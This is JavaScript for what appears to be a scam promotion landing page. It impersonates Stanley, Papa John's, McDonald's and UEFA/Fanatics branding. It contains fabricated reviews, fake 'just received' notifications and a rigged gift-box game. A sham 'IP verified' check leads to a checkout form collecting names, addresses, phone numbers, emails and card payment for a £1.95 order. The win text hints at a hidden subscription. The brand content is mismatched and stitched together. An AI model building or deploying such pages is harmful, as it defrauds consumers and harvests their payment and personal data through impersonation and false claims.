const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer:
      "This week, you can only order one item at a promotional price.",
    text: `
  Congratulations!<br><br>
  You have participated in the Stanley promotion: you have the chance to buy the STANLEY QUENCHER H2.0 thermos with an ice mold for only <b>£37</b>!
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "London, UK",
      action: "Just received the jewellery for £1.95!",
      timeago: "15 seconds ago",
    },
    {
      user: "Carlos B******",
      location: "Birmingham, UK",
      action: "Just received the jewellery for £1.95!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Mary Smith",
      time: "A day ago",
      header: "Fantastic Pizza and Friendly Service!",
      product: "26468781",
      image: "./src/img/review_1.jpg",
      review:
        "I've been to many pizza places, but Papa John's always stands out. The crust is perfectly crispy, and the toppings are always fresh and generous. The staff is incredibly friendly and attentive, making the dining experience even better. Highly recommend their pepperoni pizza – it's the best!",
    },
    {
      name: "Thomas Jones",
      time: "Two days ago",
      header: "Great Value for Money",
      product: "26468783",
      image: "./src/img/review_2.jpg",
      review:
        "Papa John's offers great value for money. The pizzas are large, packed with toppings, and very reasonably priced. I love their variety of options, and their garlic dipping sauce is a must-try! It's my go-to place for family pizza nights.",
    },
    {
      name: "Sophie Johnson",
      time: "Two days ago",
      header: "Quick Delivery and Delicious Pizza.",
      product: "26468784",
      image: "./src/img/review_3.jpg",
      review:
        "I've ordered delivery from Papa John's multiple times, and they never disappoint. The pizza always arrives hot and fresh, and the delivery is super fast. Their customer service is excellent, and the pizza tastes amazing every single time. Five stars!",
    },
    {
      name: "Julian Williams",
      time: "Four days ago",
      header: "Perfect for Gatherings",
      product: "26468781",
      image: "./src/img/review_4.jpg",
      review:
        "Papa John's is perfect for gatherings and parties. We ordered several large pizzas for a birthday party, and everyone was impressed. The pizza was flavorful, with a perfect balance of cheese and toppings. The online ordering process was easy, and the delivery was prompt. Definitely our favorite pizza place!",
    },
    {
      name: "Cameron Brown",
      time: "Seven days ago",
      header: "Consistently Great Quality",
      product: "26468782",
      review:
        "Papa John's has consistently provided us with great quality pizza. Whether dining in or taking out, the experience is always positive. The staff is friendly, the pizza is delicious, and the prices are fair. I particularly love their BBQ Chicken Bacon pizza – it's to die for!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND RATINGS",
    percent: "99%",
    rec: "Comments on this promotion",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever ordered products from McDonald's?",
        a: ["Yes, I order often", "Yes, I order rarely", "I've never ordered"],
      },
      {
        q: "Should McDonald's continue this type of advertising campaign?",
        a: ["Yes, of course!", "Yes, but change the promotional menu", "No"],
      },
      {
        q: "Would you recommend our products to your friends?",
        a: ["Yes", "No"],
      },
    ],
  };

  const check = {
    title: "Your response will be reviewed",
    arr: [
      "You have answered question 3 of 3",
      "Your IP address shows no previous orders",
      "Your response has been verified",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Thank you for participating in the survey!",
        button: "Try your luck",
        text: `
<center>
    To obtain the promotional McDonald's menu, you must choose the correct gift box.
    <br><br>
    You have 3 attempts, good luck!
</center>
          `,
      },
    },
    first: {
      texts: {
        header: "Oh, no...",
        button: "Try again",
        text: `
<center>
    Unfortunately, this gift is empty. You have two attempts left, good luck!
</center>
          `,
      },
    },
    win: {
      texts: {
        header: "",
        button: "Place the order",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Click the "Place the order" button, fill out the form, and pay for the order.
    <br>
    <br>
    In 3 to 5 days, you will receive a package at your address with a subscription card and instructions.
</center>
          `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          enabled: true,
          field: "First Name",
        },
        family: {
          enabled: true,
          field: "Last Name",
        },
        phone: {
          enabled: true,
          field: "Phone Number",
        },
        email: {
          enabled: true,
          field: "Email Address",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery Address",
        },
        zip: {
          enabled: true,
          field: "Postcode",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment by credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Details",
      oldPrice: "£37.90",
      newPrice: "£1.95",
      size: "Size",
      subTotal: {
        title: "Subtotal",
        amount: "£1.95",
      },
      deliveryTime: {
        title: "Delivery Time",
        amount: "3 days",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£1.95",
      },
      checkoutButton: "Pay for your order",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "3 Pizzas Large Papa",
      miniImg: "./src/img/slide1.jpg",
      images: ["./src/img/slide1.jpg"],
    },
    {
      id: "26468782",
      name: "ZESTY ITALIAN TRIO PIZZA",
      miniImg: "./src/img/slide2.jpg",
      images: ["./src/img/slide2.jpg"],
    },
  ];


  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.. All rights reserved. No portion of this site may be reproduced or duplicated without the express permission of UEFA and/or Fanatics (as applicable). The words UEFA, UEFA Nations League, UEFA Nations League Finals, Finalissima, UEFA U21 Championships, UEFA EURO and UEFA Women’s EURO and all other UEFA marks, names, mascots and trophies are the property, registered trademarks, designs and/or copyright of UEFA. Store maintained and operated by Fanatics (International) Limited.",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});